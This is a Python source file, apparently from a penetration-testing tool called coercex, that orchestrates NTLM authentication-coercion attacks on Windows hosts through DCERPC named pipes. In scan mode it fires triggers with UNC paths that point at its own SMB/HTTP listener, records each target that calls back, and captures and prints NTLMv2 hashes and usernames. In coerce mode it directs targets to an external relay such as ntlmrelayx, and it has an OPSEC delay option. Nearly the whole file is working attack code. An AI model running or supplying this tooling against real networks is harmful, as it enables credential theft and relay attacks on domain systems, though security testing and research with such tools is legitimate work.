"""Scan / coerce orchestrator.

Ties together the DCERPC connection pool, async listener, and method
registry into a high-performance concurrent pipeline.

Two modes:
  - scan:   Tries all path styles per method to detect vulnerabilities.
            Always starts HTTP + SMB listeners on 0.0.0.0.  If ``-l``
            is not given, the listener IP is auto-detected from the
            default network route.
  - coerce: Fires coercion triggers with UNC paths pointing at an
            **external** relay (e.g. ntlmrelayx) that the operator
            already started.  ``-l`` is required so we know where to
            point the paths, but coercex does **not** bind any port.
"""

from __future__ import annotations

import asyncio
import logging
import time
from typing import TYPE_CHECKING

from rich.console import Console

from coercex.connection import DCERPCPool

if TYPE_CHECKING:
    from coercex.cli.display import ScanDisplay
from coercex.listener import AsyncListener
from coercex.methods import get_all_methods
from coercex.methods.base import CoercionMethod, PipeBinding
from coercex.redirect import PortRedirector, setup_redirect
from coercex.models import (
    Credentials,
    Mode,
    ScanConfig,
    ScanResult,
    ScanStats,
    STATUS_STYLE,
    Transport,
    TriggerResult,
)
from coercex.net import get_local_ip, random_string
from coercex.unc import build_unc_path

log = logging.getLogger("coercex.scanner")

# Extended timeout (seconds) for the second wait_for when a connection was
# detected but the TREE_CONNECT share-path token hasn't arrived yet.
_TREE_CONNECT_EXTENDED_TIMEOUT = 10.0


class Scanner:
    """Orchestrates the coercion pipeline.

    Usage:
        scanner = Scanner(config)
        stats = await scanner.run()
    """

    def __init__(
        self,
        config: ScanConfig,
        console: Console | None = None,
        display: ScanDisplay | None = None,
    ):
        self.config = config
        self.console = console or Console(stderr=True)
        self._display = display
        self.stats = ScanStats()
        self._pool: DCERPCPool | None = None
        self._listener: AsyncListener | None = None
        self._redirector: PortRedirector | None = None
        self._redirect_active: bool = False
        self._semaphore = asyncio.Semaphore(config.concurrency)
        # Track targets confirmed vulnerable (for --stop-on-vulnerable)
        self._vulnerable_targets: set[str] = set()
        self._vulnerable_lock = asyncio.Lock()
        # Track reachable endpoints (pre-flight probe results)
        self._reachable: dict[str, set[tuple[str, str, str]]] = {}

    def _unc_port(self, transport: Transport) -> int:
        """Port to embed in UNC paths.

        When port redirect is active, returns the *standard* port (445/80)
        so that UNC paths use normal SMB format (no ``@port``).  The kernel
        transparently forwards 445 → smb_port and 80 → http_port.

        When redirect is NOT active, returns the actual listener port so
        that ``build_unc_path()`` can embed ``@port`` for non-standard ports.
        """
        if transport == Transport.HTTP:
            return 80 if self._redirect_active else self.config.http_port
        else:
            return 445 if self._redirect_active else self.config.smb_port

    async def run(self) -> ScanStats:
        """Execute the scan and return aggregate stats."""
        creds = self.config.creds or Credentials()
        self._pool = DCERPCPool(creds, timeout=self.config.timeout)

        methods = get_all_methods(
            protocols=self.config.protocols,
            methods_filter=self.config.methods_filter,
            pipes_filter=self.config.pipes_filter,
        )
        if not methods:
            log.error("No methods matched filters")
            return self.stats

        self.stats.total_targets = len(self.config.targets)

        self.console.print(
            f"[bold cyan]coercex[/] | mode=[bold]{self.config.mode.name.lower()}[/] "
            f"targets=[bold]{len(self.config.targets)}[/] methods=[bold]{len(methods)}[/] "
            f"concurrency=[bold]{self.config.concurrency}[/]"
        )

        needs_redirect = self.config.redirect and (
            self.config.smb_port != 445 or self.config.http_port != 80
        )
        if needs_redirect:
            try:
                self._redirector = setup_redirect(
                    self.config.smb_port, self.config.http_port
                )
                self._redirect_active = True
                parts: list[str] = []
                if self.config.smb_port != 445:
                    parts.append(f"445→{self.config.smb_port}")
                if self.config.http_port != 80:
                    parts.append(f"80→{self.config.http_port}")
                self.console.print(
                    f"[green]Port redirect active[/] ({', '.join(parts)}) "
                    "— UNC paths use standard ports"
                )
            except RuntimeError as exc:
                self.console.print(
                    f"[bold red]Port redirect failed:[/] {exc}\n"
                    "[dim]Falling back to WebDAV @port format[/]"
                )

        # ── Scan mode: always start listener (auto-detect IP if needed) ─
        if self.config.mode == Mode.SCAN:
            if not self.config.listener_host:
                # Pass the first target IP for route-based interface selection
                first_target = self.config.targets[0] if self.config.targets else None
                self.config.listener_host = get_local_ip(first_target)
                self.console.print(
                    f"[dim]Auto-detected listener IP: "
                    f"[bold]{self.config.listener_host}[/][/]"
                )
            enable_http = Transport.HTTP in self.config.transport
            enable_smb = Transport.SMB in self.config.transport
            # When port redirect is active, always start the SMB listener:
            # targets commonly connect back via SMB port 445 even when the
            # trigger uses an HTTP/WebDAV UNC path, and the redirect already
            # forwards 445 to our SMB port.
            if self._redirect_active and not enable_smb:
                enable_smb = True
                log.debug(
                    "Enabling SMB listener (redirect active; targets may "
                    "call back via SMB even for HTTP triggers)"
                )
            self._listener = AsyncListener(
                host="0.0.0.0",
                http_port=self.config.http_port,
                smb_port=self.config.smb_port,
                enable_http=enable_http,
                enable_smb=enable_smb,
            )
            await self._listener.start()
            listener_parts: list[str] = []
            if enable_http:
                listener_parts.append(f"http={self.config.http_port}")
            if enable_smb:
                listener_parts.append(f"smb={self.config.smb_port}")
            self.console.print(
                f"[green]Listener started[/] ({', '.join(listener_parts)})"
            )

        try:
            # Start live display after setup messages
            if self._display:
                self._display.start()

            if self.config.mode == Mode.SCAN:
                await self._run_scan(methods)
            elif self.config.mode == Mode.COERCE:
                await self._run_coerce(methods)
        finally:
            if self._display:
                self._display.stop()
            if self._pool:
                await self._pool.close_all()
            if self._listener:
                await self._listener.stop()
            if self._redirector:
                self._redirector.cleanup()
                self.console.print("[dim]Port redirect rules removed[/]")

        return self.stats

    async def _probe_endpoints(self, methods: list[CoercionMethod]) -> None:
        """Pre-flight probe: test connectivity to each unique (pipe, uuid, version).

        Caches results in self._reachable[target] = set of reachable (pipe, uuid, version) tuples.
        This both:
        1. Filters out unreachable endpoints so we don't waste time attempting them later
        2. Warms the connection pool — sessions are cached for reuse by trigger calls
        """
        if not self._pool:
            return

        # Extract unique bindings from all methods
        unique_bindings: set[tuple[str, str, str]] = set()
        for method in methods:
            for binding in method.pipe_bindings:
                unique_bindings.add((binding.pipe, binding.uuid, binding.version))

        binding_list = [
            PipeBinding(pipe=p, uuid=u, version=v) for p, u, v in unique_bindings
        ]

        total_probes = len(self.config.targets) * len(binding_list)
        log.info("Pre-flight probing %d unique endpoints", len(binding_list))

        if self._display:
            self._display.start_probe(total_probes)
        else:
            self.console.print(
                f"[dim]Probing {len(binding_list)} unique endpoints "
                f"({len(self.config.targets)} targets)…[/]"
            )

        async def _probe_one(target: str, binding: PipeBinding) -> None:
            """Probe a single (target, binding) pair."""
            async with self._semaphore:
                try:
                    await self._pool.get_session(target, binding)  # type: ignore[union-attr]
                    # Success — record as reachable
                    key = (binding.pipe, binding.uuid, binding.version)
                    self._reachable.setdefault(target, set()).add(key)
                except Exception as e:
                    # Failed — log once per binding (not per target)
                    err_str = str(e).lower()
                    if "access_denied" in err_str or "access denied" in err_str:
                        log.debug(
                            "Probe %s @ %s: ACCESS_DENIED",
                            binding.pipe,
                            target,
                        )
                    elif "not_registered" in err_str or "cannot_support" in err_str:
                        log.debug(
                            "Probe %s @ %s: NOT_AVAILABLE",
                            binding.pipe,
                            target,
                        )
                    elif "timed out" in err_str or "timeout" in err_str:
                        log.debug("Probe %s @ %s: TIMEOUT", binding.pipe, target)
                    else:
                        log.debug(
                            "Probe %s @ %s: %s",
                            binding.pipe,
                            target,
                            e.__class__.__name__,
                        )
                finally:
                    if self._display:
                        self._display.advance_probe()

        # Run all probes concurrently
        tasks = [
            asyncio.create_task(_probe_one(target, binding))
            for target in self.config.targets
            for binding in binding_list
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

        # Report summary
        for target in self.config.targets:
            reachable_count = len(self._reachable.get(target, set()))
            log.info(
                "Target %s: %d/%d endpoints reachable",
                target,
                reachable_count,
                len(binding_list),
            )
            if not self._display and reachable_count > 0:
                self.console.print(
                    f"[dim]{target}: {reachable_count}/{len(binding_list)} endpoints reachable[/]"
                )

        if self._display:
            self._display.finish_probe(
                reachable={
                    t: len(self._reachable.get(t, set())) for t in self.config.targets
                },
                total_bindings=len(binding_list),
            )

    async def _run_scan(self, methods: list[CoercionMethod]) -> None:
        """Scan mode: try all path styles per method to detect vulnerabilities."""
        allowed = self.config.transport
        scan_start = time.monotonic()

        # Pre-flight probe to filter out unreachable endpoints
        await self._probe_endpoints(methods)

        if self.config.stop_on_vulnerable:
            # Method-sequential, target-parallel: try one method at a time across
            # all non-vulnerable targets, stop when all targets are vulnerable
            await self._run_scan_sequential(methods, allowed)
        else:
            # Full parallel scan: all methods × targets × bindings × path_styles upfront
            await self._run_scan_parallel(methods, allowed)

        # Drain period: keep the listener running while ongoing handshakes
        # complete, then sweep results to upgrade ACCESSIBLE → VULNERABLE
        # and enrich VULNERABLE results that are missing auth_user.
        await self._drain_callbacks(scan_start)

    async def _run_scan_sequential(
        self, methods: list[CoercionMethod], allowed: set[Transport]
    ) -> None:
        """Sequential scan: one method at a time, all remaining targets in parallel.

        For --stop-on-vulnerable mode. Guarantees methods are tried in priority order.
        Only tries the default path_style (first in path_styles list) to minimize noise.
        """
        remaining = set(self.config.targets)

        # Set per-target totals (max possible: all methods × reachable bindings, default path_style only)
        if self._display:
            for target in self.config.targets:
                count = 0
                reachable = self._reachable.get(target, set())
                for method in methods:
                    if not method.path_styles:
                        continue
                    transport_name, _ = method.path_styles[0]
                    transport = (
                        Transport.HTTP if transport_name == "http" else Transport.SMB
                    )
                    if transport not in allowed:
                        continue
                    for binding in method.pipe_bindings:
                        key = (binding.pipe, binding.uuid, binding.version)
                        if key in reachable:
                            count += 1
                self._display.set_target_total(target, count)

        for method in methods:
            if not remaining:
                break  # All targets confirmed vulnerable

            # Filter to reachable bindings only
            reachable_bindings = []
            for binding in method.pipe_bindings:
                key = (binding.pipe, binding.uuid, binding.version)
                if any(
                    key in self._reachable.get(target, set()) for target in remaining
                ):
                    reachable_bindings.append(binding)

            if not reachable_bindings:
                continue  # No reachable bindings for this method on any remaining target

            # Use only the first path_style (default) for --stop-on-vulnerable
            if not method.path_styles:
                continue
            default_transport_name, default_path_style = method.path_styles[0]
            default_transport = (
                Transport.HTTP if default_transport_name == "http" else Transport.SMB
            )
            if default_transport not in allowed:
                continue

            # Create tasks for all remaining targets × reachable bindings
            tasks = []
            for target in list(remaining):
                reachable = self._reachable.get(target, set())
                for binding in reachable_bindings:
                    key = (binding.pipe, binding.uuid, binding.version)
                    if key not in reachable:
                        continue
                    task = asyncio.create_task(
                        self._attempt(
                            target,
                            method,
                            binding,
                            transport_override=default_transport,
                            path_style_override=default_path_style,
                        )
                    )
                    tasks.append(task)

            if tasks:
                log.debug(
                    "Sequential scan: method %s (priority %d) — %d tasks for %d targets",
                    method.function_name,
                    method.priority,
                    len(tasks),
                    len(remaining),
                )
                await asyncio.gather(*tasks, return_exceptions=True)

                # Remove vulnerable targets from remaining set
                remaining -= self._vulnerable_targets

    async def _run_scan_parallel(
        self, methods: list[CoercionMethod], allowed: set[Transport]
    ) -> None:
        """Parallel scan: all methods × targets × bindings × path_styles upfront.

        For full scan mode (no --stop-on-vulnerable). Tries all path_styles to
        identify every vulnerable method.
        """
        all_tasks: list[asyncio.Task[None]] = []
        # Track per-target task counts for the display
        target_task_counts: dict[str, int] = {t: 0 for t in self.config.targets}

        for target in self.config.targets:
            reachable = self._reachable.get(target, set())
            for method in methods:
                for binding in method.pipe_bindings:
                    # Skip unreachable bindings
                    key = (binding.pipe, binding.uuid, binding.version)
                    if key not in reachable:
                        continue
                    for transport_name, path_style in method.path_styles:
                        transport = (
                            Transport.HTTP
                            if transport_name == "http"
                            else Transport.SMB
                        )
                        if transport not in allowed:
                            continue
                        task = asyncio.create_task(
                            self._attempt(
                                target,
                                method,
                                binding,
                                transport_override=transport,
                                path_style_override=path_style,
                            )
                        )
                        all_tasks.append(task)
                        target_task_counts[target] += 1

        # Set per-target totals on the display
        if self._display:
            for target, count in target_task_counts.items():
                self._display.set_target_total(target, count)

        log.debug("Parallel scan: %d total tasks created", len(all_tasks))
        await asyncio.gather(*all_tasks, return_exceptions=True)

    # ── COERCE: targeted single-path triggers (no local listener) ──

    async def _run_coerce(self, methods: list[CoercionMethod]) -> None:
        """Coerce mode: fire each method once per transport, pointing at external relay."""
        tasks: list[asyncio.Task[None]] = []
        target_task_counts: dict[str, int] = {t: 0 for t in self.config.targets}

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    for transport in self.config.transport:
                        task = asyncio.create_task(
                            self._attempt_coerce(target, method, binding, transport)
                        )
                        tasks.append(task)
                        target_task_counts[target] += 1

        if self._display:
            for target, count in target_task_counts.items():
                self._display.set_target_total(target, count)

        await asyncio.gather(*tasks, return_exceptions=True)

    # ── DRAIN: wait for late callbacks after all tasks complete ──────

    async def _drain_callbacks(self, scan_start: float) -> None:
        """Wait for late callbacks and enrich VULNERABLE results.

        After all ``_attempt()`` tasks complete, ongoing SMB handshakes
        may still be running in the listener.  The per-attempt
        ``callback_timeout`` may have expired while the handshake was
        mid-flight (e.g. Type 3 NTLM not yet parsed).

        This method:
        1. Sleeps ``callback_timeout`` seconds so handshakes can finish.
        2. Sweeps VULNERABLE results with empty ``auth_user`` → enriches
           them with NTLM credentials from the completed handshake.

        Note: we intentionally do NOT upgrade ACCESSIBLE/UNKNOWN_ERROR
        results to VULNERABLE here.  Timestamp-based correlation cannot
        distinguish which concurrent trigger caused a callback, leading
        to false positives across transports/methods.
        """
        if not self._listener:
            return

        needs_drain = any(
            r.result == TriggerResult.VULNERABLE and not r.auth_user
            for r in self.stats.results
        )
        if not needs_drain:
            return

        log.debug(
            "Drain: waiting %ss for late callbacks / handshake completion",
            self.config.callback_timeout,
        )
        if self._display:
            self._display.start_drain()
        else:
            self.console.print(
                f"[dim]Waiting {self.config.callback_timeout:.0f}s for late callbacks…[/]"
            )
        await asyncio.sleep(self.config.callback_timeout)

        listener = self._listener
        for result in self.stats.results:
            if result.result == TriggerResult.VULNERABLE and not result.auth_user:
                # Callback arrived but handshake wasn't done yet.
                # Now the handshake may have completed; re-check.
                cb = listener.get_callback_since(result.target, scan_start)
                if cb is not None and cb.username:
                    result.auth_user = (
                        f"{cb.domain}\\{cb.username}" if cb.domain else cb.username
                    )
                    if cb.ntlmv2_hash and not result.ntlmv2_hash:
                        result.ntlmv2_hash = cb.ntlmv2_hash

        if self._display:
            self._display.finish_drain()

    async def _attempt_coerce(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport: Transport,
    ) -> None:
        """Single coerce trigger — fire and report SENT, no classification.

        Coerce mode just sends triggers to an external relay.  We don't
        classify RPC results because the relay intercepts the auth and
        the RPC call will typically timeout or error.  We only distinguish
        between "we managed to send the trigger" (SENT) and "we couldn't
        even connect to the pipe" (CONNECT_ERROR).
        """
        pool = self._pool
        assert pool is not None
        async with self._semaphore:
            port = self._unc_port(transport)
            token = random_string(12)
            path = build_unc_path(
                self.config.listener_host,
                token,
                transport,
                port=port,
                path_style="share_file",
            )

            # Try to connect to the pipe
            try:
                dce = await pool.get_session(target, binding)
            except Exception as e:
                result = ScanResult(
                    target=target,
                    protocol=method.protocol_short,
                    method=method.function_name,
                    pipe=binding.pipe,
                    uuid=binding.uuid,
                    result=TriggerResult.CONNECT_ERROR,
                    transport=transport.name.lower(),
                    path_style="share_file",
                    error=str(e),
                )
                self.stats.add(result)
                self._emit(result)
                return

            # Fire the trigger — we don't care about the RPC response
            try:
                trigger_fn = method.trigger_fn
                if trigger_fn is None:
                    raise ValueError(f"No trigger function for {method.function_name}")
                await asyncio.to_thread(trigger_fn, dce, path, target)
            except Exception:
                pass  # Expected: relay intercepts auth, RPC call fails

            result = ScanResult(
                target=target,
                protocol=method.protocol_short,
                method=method.function_name,
                pipe=binding.pipe,
                uuid=binding.uuid,
                result=TriggerResult.SENT,
                transport=transport.name.lower(),
                path_style="share_file",
            )
            self.stats.add(result)
            self._emit(result)

    async def _attempt(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport_override: Transport | None = None,
        path_style_override: str | None = None,
    ) -> None:
        """Single trigger attempt, bounded by semaphore."""
        pool = self._pool
        assert pool is not None

        try:
            async with self._semaphore:
                # Delay for OPSEC if configured
                if self.config.delay > 0:
                    await asyncio.sleep(self.config.delay)

                # Early exit if target already confirmed vulnerable
                if self.config.stop_on_vulnerable:
                    async with self._vulnerable_lock:
                        if target in self._vulnerable_targets:
                            log.debug(
                                "Skipping %s (already confirmed vulnerable via --stop-on-vulnerable)",
                                target,
                            )
                            return

                transport = transport_override or Transport.SMB
                path_style = path_style_override or "share_file"

                use_listener = self.config.has_listener and self._listener is not None

                if not use_listener:
                    # No listener: dummy path, classify errors only
                    path = build_unc_path(
                        "127.0.0.1", "coercexscan", transport, path_style=path_style
                    )
                    result = await pool.trigger_method(target, method, binding, path)
                else:
                    # Listener active: real path with correlation token
                    listener = self._listener
                    assert listener is not None
                    token, future = listener.create_token(target_ip=target)

                    port = self._unc_port(transport)
                    path = build_unc_path(
                        self.config.listener_host,
                        token,
                        transport,
                        port=port,
                        path_style=path_style,
                    )

                    # Record wall-clock BEFORE trigger so we can check for
                    # callbacks that arrived during this attempt's window
                    # even if FIFO assigned them to the wrong token.
                    t_before = time.monotonic()

                    result = await pool.trigger_method(target, method, binding, path)

                    # Wait for callback if trigger indicated vulnerability
                    # or returned an unclassified error (the trigger may have
                    # fired even if the RPC error code is unrecognised).
                    if result.result in (
                        TriggerResult.VULNERABLE,
                        TriggerResult.ACCESSIBLE,
                        TriggerResult.UNKNOWN_ERROR,
                    ):
                        # Two-stage await for token-based correlation:
                        # Stage 1: Normal timeout (callback_timeout)
                        # Use shield() so the future is NOT cancelled on
                        # timeout — we may re-await it in Stage 2.
                        try:
                            callback = await asyncio.wait_for(
                                asyncio.shield(future),
                                timeout=self.config.callback_timeout,
                            )
                            # Token-based resolution succeeded
                            result.callback_received = True
                            result.source_ip = callback.source_ip
                            result.result = TriggerResult.VULNERABLE
                            if callback.ntlmv2_hash:
                                result.ntlmv2_hash = callback.ntlmv2_hash
                            if callback.username:
                                result.auth_user = (
                                    f"{callback.domain}\\{callback.username}"
                                    if callback.domain
                                    else callback.username
                                )
                        except asyncio.TimeoutError:
                            # Stage 2: Check if a connection arrived but handshake is in progress
                            if listener.has_connection_from(target, t_before):
                                # Connection detected — give handshake more time to reach TREE_CONNECT
                                log.debug(
                                    "Connection from %s detected, extending wait for TREE_CONNECT...",
                                    target,
                                )
                                try:
                                    callback = await asyncio.wait_for(
                                        future,
                                        timeout=_TREE_CONNECT_EXTENDED_TIMEOUT,
                                    )
                                    # Token resolved via TREE_CONNECT after extended wait
                                    result.callback_received = True
                                    result.source_ip = callback.source_ip
                                    result.result = TriggerResult.VULNERABLE
                                    if callback.ntlmv2_hash:
                                        result.ntlmv2_hash = callback.ntlmv2_hash
                                    if callback.username:
                                        result.auth_user = (
                                            f"{callback.domain}\\{callback.username}"
                                            if callback.domain
                                            else callback.username
                                        )
                                    log.debug(
                                        "TREE_CONNECT completed after extended wait: %s %s::%s",
                                        target,
                                        method.protocol_short,
                                        method.function_name,
                                    )
                                except asyncio.TimeoutError:
                                    # TREE_CONNECT never arrived — token
                                    # resolution failed.  Fall back to
                                    # timestamp-based correlation.  This is
                                    # safe here because t_before is scoped
                                    # to this attempt and
                                    # has_connection_from() already proved
                                    # the target connected after our
                                    # trigger.  (Some targets strip the
                                    # token from the TREE_CONNECT path.)
                                    #
                                    # We also verify the callback transport
                                    # matches the trigger transport to
                                    # avoid cross-transport false positives
                                    # (e.g. an SMB callback being claimed
                                    # by an HTTP trigger).
                                    cb = listener.get_callback_since(target, t_before)
                                    trigger_transport = transport.name.lower()
                                    if (
                                        cb is not None
                                        and cb.transport == trigger_transport
                                    ):
                                        result.callback_received = True
                                        result.source_ip = cb.source_ip
                                        result.result = TriggerResult.VULNERABLE
                                        if cb.ntlmv2_hash:
                                            result.ntlmv2_hash = cb.ntlmv2_hash
                                        if cb.username:
                                            result.auth_user = (
                                                f"{cb.domain}\\{cb.username}"
                                                if cb.domain
                                                else cb.username
                                            )
                                        log.debug(
                                            "Timestamp fallback resolved %s %s::%s",
                                            target,
                                            method.protocol_short,
                                            method.function_name,
                                        )
                                    else:
                                        if cb is not None:
                                            log.debug(
                                                "Extended wait: callback transport mismatch "
                                                "(%s != %s) for %s %s::%s",
                                                cb.transport,
                                                trigger_transport,
                                                target,
                                                method.protocol_short,
                                                method.function_name,
                                            )
                                        else:
                                            log.debug(
                                                "Extended wait timed out for %s %s::%s — no callback data",
                                                target,
                                                method.protocol_short,
                                                method.function_name,
                                            )
                            else:
                                # No connection at all — target didn't call back
                                log.debug(
                                    "No callback from %s for %s::%s",
                                    target,
                                    method.protocol_short,
                                    method.function_name,
                                )
                    else:
                        listener.cancel_token(token)

                # Populate transport / path_style on every result
                result.transport = transport.name.lower()
                result.path_style = path_style

                # Mark target as vulnerable if confirmed
                if (
                    result.result == TriggerResult.VULNERABLE
                    and self.config.stop_on_vulnerable
                ):
                    async with self._vulnerable_lock:
                        self._vulnerable_targets.add(target)
                    log.info(
                        "Target %s confirmed vulnerable (%s::%s) — will skip further methods",
                        target,
                        method.protocol_short,
                        method.function_name,
                    )
                    if self._display:
                        self._display.mark_target_done(target, "vulnerable")

                self.stats.add(result)
                self._emit(result)
        except asyncio.CancelledError:
            # Task was cancelled due to --stop-on-vulnerable
            log.debug(
                "Cancelled: %s %s::%s (target already vulnerable)",
                target,
                method.protocol_short,
                method.function_name,
            )
            # Don't record cancelled attempts in stats
            raise

    def _emit(self, result: ScanResult) -> None:
        """Report a result to the live display or fallback to console lines."""
        if self._display:
            self._display.add_result(result)
            return
        self._emit_line(result)

    def _emit_line(self, result: ScanResult) -> None:
        """Legacy per-line output (used when no live display is attached)."""
        show = self.config.verbose or result.result in (
            TriggerResult.VULNERABLE,
            TriggerResult.ACCESSIBLE,
            TriggerResult.SENT,
            TriggerResult.UNKNOWN_ERROR,
        )
        if show:
            style, sym = STATUS_STYLE.get(result.result, ("dim red", "[?]"))
            cb = " [bold green](callback!)[/]" if result.callback_received else ""
            tr = f" [dim]({result.transport})[/]" if result.transport else ""
            auth = f" [bold magenta]{result.auth_user}[/]" if result.auth_user else ""
            err = (
                f" [dim red]{result.error[:80]}[/]"
                if result.error and result.result == TriggerResult.UNKNOWN_ERROR
                else ""
            )
            self.console.print(
                f"[{style}]{sym}[/] {result.target} | "
                f"[blue]{result.protocol}[/]::{result.method} "
                f"via [dim]{result.pipe}[/]{tr}{cb}{auth}{err}"
            )
            if result.ntlmv2_hash:
                self.console.print(
                    f"    [bold yellow]Hash:[/] {result.ntlmv2_hash}",
                    highlight=False,
                )
